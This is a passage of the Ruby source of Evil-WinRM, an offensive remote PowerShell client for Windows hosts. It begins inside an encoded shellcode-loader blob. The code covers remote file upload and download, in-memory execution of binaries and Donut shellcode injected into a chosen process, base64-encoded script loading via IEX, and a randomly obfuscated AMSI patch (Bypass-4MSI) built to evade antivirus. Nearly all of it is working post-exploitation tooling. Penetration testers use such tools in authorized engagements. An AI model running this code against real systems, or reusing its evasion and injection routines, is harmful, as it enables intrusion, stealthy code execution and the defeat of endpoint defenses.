IDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAKW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5XTo6TG9hZCgkYnl0ZXMpIHwgT3V0LU51bGwKJGJhc2U2NCA9ICRkb251dGZpbGUKW2FycmF5XSRhcnJheSA9ICRwcm9jZXNzX2lkLCRCYXNlNjQKW1NoZWxsY29kZVRlc3QuUHJvZ3JhbV06Ok1haW4oJGFycmF5KQp9Cn0KZnVuY3Rpb24gc2hvdy1tZXRob2RzLWxvYWRlZCB7JGdsb2JhbDpzaG93bWV0aG9kc30K")

        command = ""

        begin
            time = Time.now.to_i
            self.print_message("Establishing connection to remote endpoint", TYPE_INFO)
            $conn.shell(:powershell) do |shell|
                begin
                    completion =
                    proc do |str|
                    case
                        when Readline.line_buffer =~ /help.*/i
                            puts("#{$LIST.join("\t")}")
                        when Readline.line_buffer =~ /Invoke-Binary.*/i
                            result = @executables.grep( /^#{Regexp.escape(str)}/i ) || []
                            if result.empty? then
                                paths = self.paths(str)
                                result.concat(paths.grep( /^#{Regexp.escape(str)}/i ))
                            end
                            result.uniq
                        when Readline.line_buffer =~ /donutfile.*/i
                            paths = self.paths(str)
                            paths.grep( /^#{Regexp.escape(str)}/i )
                        when Readline.line_buffer =~ /Donut-Loader -process_id.*/i
                            $DONUTPARAM2.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /Donut-Loader.*/i
                            $DONUTPARAM1.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
                        when Readline.line_buffer =~ /^upload.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.paths(str) || []
                            else
                                self.complete_path(str, shell) || []
                            end
                        when Readline.line_buffer =~ /^download.*/i
                            test_s = Readline.line_buffer.gsub('\\ ', '\#\#\#\#')
                            if test_s.count(' ') < 2 then
                                self.complete_path(str, shell) || []
                            else
                                paths = self.paths(str)
                            end
                        when (Readline.line_buffer.empty? || !(Readline.line_buffer.include?(' ') || Readline.line_buffer =~ /^\"?(\.\/|\.\.\/|[a-z,A-Z]\:\/|\~\/|\/)/))
                            result = $COMMANDS.grep( /^#{Regexp.escape(str)}/i ) || []
                            result.concat(@functions.grep(/^#{Regexp.escape(str)}/i))
                            result.uniq
                        else
                            result = Array.new
                            result.concat(self.complete_path(str, shell) || [])
                            result
                        end
                    end

                    Readline.completion_proc = completion
                    Readline.completion_append_character = ''
                    Readline.completion_case_fold = true
                    Readline.completer_quote_characters = "\""

                    until command == "exit" do
                        pwd = shell.run("(get-location).path").output.strip

                        if $colors_enabled then
                            command = Readline.readline(self.colorize("*Evil-WinRM*", "red") + self.colorize(" PS ", "yellow") + pwd + "> ", true)
                        else
                            command = Readline.readline("*Evil-WinRM* PS " + pwd + "> ", true)
                        end
                        if !$logger.nil?
                            $logger.info("*Evil-WinRM* PS #{pwd} > #{command}")
                        end

                        if command.start_with?('upload') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_upload_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Uploading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                file_manager.upload(left_path, right_path) do |bytes_copied, total_bytes|
                                    self.progress_bar(bytes_copied, total_bytes)
                                    if bytes_copied == total_bytes then
                                        puts("                                                             ")
                                        self.print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA, true, $logger)
                                        self.print_message("Upload successful!", TYPE_INFO, true, $logger)
                                    end
                                end
                            rescue StandardError => err
                                self.print_message("#{err.to_s}: #{err.backtrace}", TYPE_ERROR, true, $logger)
                                self.print_message("Upload failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('download') then
                            if self.docker_detection() then
                                puts()
                                self.print_message("Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command", TYPE_WARNING, true, $logger)
                            end

                            begin
                                paths = self.get_download_paths(command, pwd)
                                right_path = paths.pop
                                left_path = paths.pop

                                self.print_message("Downloading #{left_path} to #{right_path}", TYPE_INFO, true, $logger)
                                size = self.filesize(shell, left_path)
                                file_manager.download(left_path, right_path, size: size) do | index, size |
                                    self.progress_bar(index, size)
                                end
                                puts("                                                             ")
                                self.print_message("Download successful!", TYPE_INFO, true, $logger)
                            rescue StandardError => err
                                self.print_message("Download failed. Check filenames or paths", TYPE_ERROR, true, $logger)
                            ensure
                                command = ""
                            end
                        elsif command.start_with?('Invoke-Binary') then
                            begin
                                invoke_Binary = command.tokenize
                                command = ""
                                if !invoke_Binary[1].to_s.empty? then
                                    load_executable = invoke_Binary[1]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    if !invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable + " ," + invoke_Binary[2])
                                        puts(output.output)
                                    elsif invoke_Binary[2].to_s.empty?
                                        output = shell.run("Invoke-Binary " + load_executable)
                                        puts(output.output)
                                    end
                                elsif
                                    output = shell.run("Invoke-Binary")
                                    puts(output.output)
                                end
                            rescue StandardError => err
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('Donut-Loader') then
                            begin
                                donut_Loader = command.tokenize
                                command = ""
                                if !donut_Loader[4].to_s.empty? then
                                    pid = donut_Loader[2]
                                    load_executable = donut_Loader[4]
                                    load_executable = File.binread(load_executable)
                                    load_executable = Base64.strict_encode64(load_executable)
                                    output = shell.run("Donut-Loader -process_id #{pid} -donutfile #{load_executable}")
                                elsif
                                    output = shell.run("Donut-Loader")
                                end
                                print(output.output)
                                if !$logger.nil?
                                    $logger.info(output.output)
                                end
                            rescue
                                self.print_message("Check filenames", TYPE_ERROR, true, $logger)
                            end

                        elsif command.start_with?('services') then
                            command = ""
                            output = shell.run('$servicios = Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath  ; foreach ($servicio in $servicios  ) {Get-Service $servicio.PSChildName -ErrorAction SilentlyContinue | Out-Null ; if ($? -eq $true) {$privs = $true} else {$privs = $false} ; $Servicios_object = New-Object psobject -Property @{"Service" = $servicio.pschildname ; "Path" = $servicio.imagepath ; "Privileges" = $privs} ;  $Servicios_object }')
                            print(output.output.chomp)
                            if !$logger.nil?
                                $logger.info(output.output.chomp)
                            end
                        elsif command.start_with?(*@functions) then
                            self.silent_warnings do
                                load_script = $scripts_path + command
                                command = ""
                                load_script = load_script.gsub(" ","")
                                load_script = File.binread(load_script)
                                load_script = Base64.strict_encode64(load_script)
                                script_split = load_script.scan(/.{1,5000}/)
                                script_split.each do |item|
                                    output = shell.run("$a += '#{item}'")
                                end
                                output = shell.run("IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($a))).replace('???','')")
                                output = shell.run("$a = $null")
                            end

                        elsif command.start_with?('menu') then
                            command = ""
                            self.silent_warnings do
                                output = shell.run(menu)
                                output = shell.run("Menu")
                                autocomplete = shell.run("auto").output.chomp
                                autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                                assemblyautocomplete = shell.run("show-methods-loaded").output.chomp
                                assemblyautocomplete = assemblyautocomplete.gsub!(/\r\n?/, "\n")
                                if !assemblyautocomplete.to_s.empty?
                                    $LISTASSEMNOW = assemblyautocomplete.split("\n")
                                    $LISTASSEM = $LISTASSEM + $LISTASSEMNOW
                                end
                                $LIST2 = autocomplete.split("\n")
                                $LIST = $LIST + $LIST2
                                $COMMANDS = $COMMANDS + $LIST2
                                $COMMANDS = $COMMANDS.uniq
                                message_output = output.output.chomp("\n") + "[+] " + $CMDS.join("\n").gsub(/\n/, "\n[+] ") + "\n"
                                puts(message_output)
                                if !$logger.nil?
                                    $logger.info(message_output)
                                end
                            end

                        elsif (command == "Bypass-4MSI")
                            timeToWait = (time + 20) - Time.now.to_i

                            if timeToWait > 0
                                puts()
                                self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING, true, $logger)
                                sleep(timeToWait)
                            end
                            if !@Bypass_4MSI_loaded
                                self.load_Bypass_4MSI(shell)
                                @Bypass_4MSI_loaded = true
                            end
                            command = @bypass_amsi_real_name
                        end
                        output = shell.run(command) do |stdout, stderr|
                            stdout&.each_line do |line|
                                STDOUT.puts(line.rstrip!)
                            end
                            STDERR.print(stderr)
                        end
                        if !$logger.nil? && !command.empty?
                            output_logger=""
                            output.output.each_line do |line|
                                output_logger += "#{line.rstrip!}\n"
                            end
                            $logger.info(output_logger)
                        end
                    end
                rescue Errno::EACCES => ex
                    puts()
                    self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
                    retry
                rescue Interrupt
                    puts("\n\n")
                    self.print_message("Press \"y\" to exit, press any other key to continue", TYPE_WARNING, true, $logger)
                    if STDIN.getch.downcase == "y"
                        self.custom_exit(130)
                    else
                        retry
                    end
                end
            self.custom_exit(0)
        end
        rescue SystemExit
        rescue SocketError
            self.print_message("Check your /etc/hosts file to ensure you can resolve #{$host}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        rescue Exception => ex
            self.print_message("An error of type #{ex.class} happened, message is #{ex.message}", TYPE_ERROR, true, $logger)
            self.custom_exit(1)
        end
    end

    def random_string(len=3)
        Array.new(len){ [*'0'..'9',*'A'..'Z',*'a'..'z'].sample }.join
    end

    def random_case(word)
        word.chars.map { |c| (rand 2) == 0 ? c : c.upcase }.join
    end

    def get_char_expresion(the_char)
        rand_val = rand(10000) + rand(100)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")

        return "[#{char_val}](#{val.to_s}-#{rand_val.to_s})"
    end

    def get_byte_expresion(the_char)
        rand_val = rand(30..120)
        val = the_char.ord + rand_val
        char_val = self.random_case("char")
        byte_val = self.random_case("byte")

        return "[#{char_val}]([#{byte_val}] 0x#{val.to_s(16)}-0x#{rand_val.to_s(16)})"
    end

    def get_char_raw(the_char)
        return "\"#{the_char}\""
    end

    def generate_random_type_string()
        to_randomize = self.random_case("System.Management.Automation.AmsiUtils")
        result = ""
        to_randomize.chars.each { |c| result +=  "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_raw(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
        result[1..-1]
    end

    def generate_random_patched_message()
        the_chars = "patched!".chars
        the_emos = [":-)", ";-)", "xd", ":p", ";-p", ";-d"]
        the_emos_l = the_emos.length()
        result = ""
        the_chars.each { |c| result += c*(rand(3) + 1)}
        result = result + " " + the_emos[rand(the_emos_l)]
        return self.random_case("\"#{result}\"")
    end

    def get_Bypass_4MSI()
        bypass_template = "ZnVuY3Rpb24gX19GVU5DVElPTl9OQU1FX18ge1tSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6V3JpdGVCeXRlKFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoIiIrJHZhcjErIiIsICRmYWxzZSwgJHRydWUpLkdldEZpZWxkKCcnKyQoW1N5c3RlbS5OZXQuV2ViVXRpbGl0eV06Okh0bWxEZWNvZGUoJyYjOTc7JiMxMDk7JiMxMTU7JiMxMDU7JykpKydDb250ZXh0JyxbUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdJ05vblB1YmxpYyxTdGF0aWMnKS5HZXRWYWx1ZSgkbnVsbCksNSk7JHZhcjJ9"

        dec_template = Base64.decode64(bypass_template)
        function_name = @bypass_amsi_function_names[rand(@bypass_amsi_function_names.length()-1)] + self.random_string()
        result = dec_template.gsub("#{@bypass_amsi_main_function_name}", function_name)
        @bypass_amsi_real_name = function_name
        result = result.gsub("$var1", self.generate_random_type_string())
        result = result.gsub("$var2", self.generate_random_patched_message())
        @bypass_amsi_words_random_case.each {|w| result.gsub!("#{w}", self.random_case(w)) }
        result
    end

    def load_Bypass_4MSI(shell)
        bypass = self.get_Bypass_4MSI()
        output = shell.run(bypass)
        puts(output.output)
    end

    def extract_filename(path)
        path.split('/')[-1]
    end

    def extract_next_quoted_path(cmd_with_quoted_path)
        begin_i = cmd_with_quoted_path.index("\"")
        l_total = cmd_with_quoted_path.length()
        next_i = cmd_with_quoted_path[begin_i +1, l_total - begin_i].index("\"")
        result = cmd_with_quoted_path[begin_i +1, next_i]
        result
    end

    def get_upload_paths(upload_command, pwd)
        quotes = upload_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = upload_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(upload_command)
            upload_command = upload_command.gsub("\"#{quoted_path}\"", '')
            result = upload_command.split(' ')
            result.delete_at(0)
            result.push(quoted_path) unless quoted_path.nil? || quoted_path.empty?
        end
        result.push("#{pwd}\\#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_download_paths(download_command, pwd)
        quotes = download_command.count("\"")
        result = []
        if quotes == 0 || quotes % 2 != 0 then
            result = download_command.split(' ')
            result.delete_at(0)
        else
            quoted_path = self.extract_next_quoted_path(download_command)
            download_command = download_command.gsub("\"#{quoted_path}\"", '')
            result.push(quoted_path)
            rest = download_command.split(' ')
            unless rest.nil? || rest.empty?
                rest.delete_at(0)
                result.push(rest[0]) if rest.length == 1
            end
        end

        result.push("./#{self.extract_filename(result[0])}") if result.length == 1
        result
    end

    def get_from_cache(n_path)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            current_vals = @directories[a_path]
            result = Array.new
            unless current_vals.nil? then
                is_valid = current_vals['time'] > current_time - @cache_ttl
                result = current_vals['files'] if is_valid
                @directories.delete(a_path) unless is_valid
            end

            return result
        end
    end

    def set_cache(n_path, paths)
        unless n_path.nil? || n_path.empty? then
            a_path = self.normalize_path(n_path)
            current_time = Time.now.to_i
            @directories[a_path] = { 'time' => current_time, 'files' => paths }
        end
    end

    def normalize_path(str)
        p_str = str || ""
        p_str = str.gsub('\\', '/')
        p_str = Regexp.escape(str)
        p_str
    end

    def get_dir_parts(n_path)
        return [n_path, "" ] if !!(n_path[-1] =~ /\/$/)
        i_last = n_path.rindex('/')
        if i_last.nil?
            return ["./", n_path]
        end

        next_i = i_last + 1
        amount = n_path.length() - next_i

        return [n_path[0, i_last + 1], n_path[next_i, amount]]
    end

    def complete_path(str, shell)
        if @completion_enabled then
            if !str.empty? && !!(str =~ /^(\.\/|[a-z,A-Z]\:|\.\.\/|\~\/|\/)*/i) then
                n_path = str
                parts = self.get_dir_parts(n_path)
                dir_p = parts[0]
                nam_p = parts[1]
                result = []
                result = self.get_from_cache(dir_p) unless dir_p =~ /^(\.\/|\.\.\/|\~|\/)/

                if result.nil? || result.empty? then
                    target_dir = dir_p
                    pscmd = "$a=@();$(ls '#{target_dir}*' -ErrorAction SilentlyContinue -Force |Foreach-Object {  if((Get-Item $_.FullName -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo] ){ $a +=  \"$($_.FullName.Replace('\\','/'))/\"}else{  $a += \"$($_.FullName.Replace('\\', '/'))\" } });$a += \"$($(Resolve-Path -Path '#{target_dir}').Path.Replace('\\','/'))\";$a"

                    output = shell.run(pscmd).output
                    s = output.to_s.gsub(/\r/, '').split(/\n/)

                    dir_p = s.pop
                    self.set_cache(dir_p, s)
                    result = s
                end
                dir_p = dir_p + "/" unless dir_p[-1] == "/"
                path_grep = self.normalize_path(dir_p + nam_p)
                path_grep = path_grep.chop() if !path_grep.empty? && path_grep[0] == "\""
                filtered = result.grep(/^#{path_grep}/i)
                return filtered.collect{ |x| "\"#{x}\"" }
            end
        end
    end
end

# Class to create array (tokenize) from a string
class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

# Execution
e = EvilWinRM.new
e.main
